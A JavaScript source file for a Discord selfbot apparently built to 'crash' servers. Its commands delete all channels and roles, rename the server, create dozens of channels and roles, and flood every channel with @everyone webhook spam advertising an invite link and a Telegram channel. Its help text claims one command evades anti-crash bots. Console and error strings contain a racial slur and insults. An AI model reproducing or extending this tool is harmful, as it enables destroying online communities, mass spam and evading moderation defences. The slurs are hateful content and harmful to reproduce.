const token = process.env['TOKEN']
const Discord = require('discord.js-selfbot');
const keepAlive = require('./server.js');
const { MessageEmbed } = require('discord.js');
const allowedusers = [
  "946841657314279485",
]
// там ваш айди
const client = new Discord.Client();


client.on('ready', () => { //при загрузке бота
console.log("негры");
}); 





client.on('message', async (message) => {
  if (message.content === '~auto') {
  if (allowedusers.includes(message.author.id)) {
    message.delete(); 
    try { 
     message.guild.channels.cache.forEach 
     (channel => channel.delete());  
     } catch { 
        message.channel.send("Негр ошибка");
        } 
        message.guild.roles.cache.forEach(role => { 
        if (role.editable && role.id !== message.guild.id) role.delete() 
    }); 
    await message.guild.setIcon("https://media.discordapp.net/attachments/937000390862471269/938807454374969434/blood.jpg");
    await message.guild.setName("×××Crashed by austr×××");

    for (let i = 1; i <= 25; i++) {
        message.guild.channels
          .create("crashed-by-austr", {
            type: "text",
            topic: "https://discord.gg/lavanbot",
          })
          .then(channel => {
              channel.createWebhook("×××Crashed by austr×××", { 
				}).then(async webhook => {
                  for (let i = 1; i <= 30; i++) { 
                            webhook.send({
	content: '@everyone @here данный сервер крашится. Переходите к нам если хотите также. У нас есть все, что вам нужною https://discord.gg/lavanbot https://t.me/web_anarchy',
});      
                  };
              });
          });
      } 1000;
    } else {console.log('ваша мама шлюха')}
};
});



client.on('message', async (message) => {
  if (message.content === '~hookall') {
  if (allowedusers.includes(message.author.id)) {
    message.delete(); 
     message.guild.channels.cache.forEach
     (channel => {channel.createWebhook("×××Crashed by austr×××", { 
              }).then(async webhook => {
                  for (let i = 1; i <= 25; i++) {
                            webhook.send({
	content: '@everyone @here данный сервер крашится. Переходите к нам если хотите также. У нас есть все, что вам нужною https://discord.gg/lavanbot https://t.me/web_anarchy',
});        
                  };
              });
          });
        };
    } else {console.log('ваша мама шлюха')}
});



client.on('message', async (message) => {
  if (message.content === '~createhooks') {
  if (allowedusers.includes(message.author.id)) {
    message.delete(); 
     message.guild.channels.cache.forEach
     (channel => {channel.createWebhook("×××Crashed by austr×××", {})
          });
        };
    } else {console.log('ваша мама шлюха')}
});


client.on('message', async (message) => {
  if (message.content === '~nuke') {
  if (allowedusers.includes(message.author.id)) {
    message.delete(); 
    try {
     message.guild.channels.cache.forEach 
     (channel => channel.delete()); 
     } catch { 
        message.channel.send("Негр ошибка");
        } 
        message.guild.roles.cache.forEach(role => { 
        if (role.editable && role.id !== message.guild.id) role.delete() 
    }); 
    } else {console.log('ваша мама шлюха')}
};
});


client.on('message', async (message) => {
  if (message.content === '~renamechannels') {
  if (allowedusers.includes(message.author.id)) {
    message.delete(); 
    try {
     message.guild.channels.cache.forEach 
     (channel => channel.setName("crashed-by-austr"));  
     } catch { 
        console.log(error)
        } 
    } else {console.log('ваша мама шлюха')}
};
});


client.on('message', message => {
  if (message.content === '~ping') {
  if (allowedusers.includes(message.author.id)) {
    message.delete();
    message.channel.send(`Пинг ${Date.now() - message.createdTimestamp}ms. API-пинг ${Math.round(client.ws.ping)}ms`);
  }
    } else {console.log('ваша мама шлюха')}
});

client.on('message', (msg) => {
  if (msg.content === '~help') {
  if (allowedusers.includes(msg.author.id)) {
    msg.delete();
    let now = Date.now()
    msg.channel.send('`~auto` - **полный автоматический краш сервера**\n`~nuke` - **удаление всех каналов и ролей**\n`~ping` - **показывает задержку селф бота**\n`~renamechannels` - **обходит анти-краш ботов**\n`~roles` - **создание ролей**\n`~hookall` - **спам во все каналы вебюхуками**\n`~createhooks` - **создание вебхуков везде**')
  }
    } else {console.log('ваша мама шлюха')}
})





client.on('message', (msg) => {
  if (msg.content === '~roles') {
  if (allowedusers.includes(msg.author.id)) {
    msg.delete();
    for (let i = 1; i <= 50; i++) {
        msg.guild.roles
          .create({
            data: {
              name: "💣 Crashed by Austr 💣",
              color: "#ff0000",
            },
          })
          .catch(console.error);
      }
  }
    } else {console.log('ваша мама шлюха')}
})


keepAlive();
client.login(token);
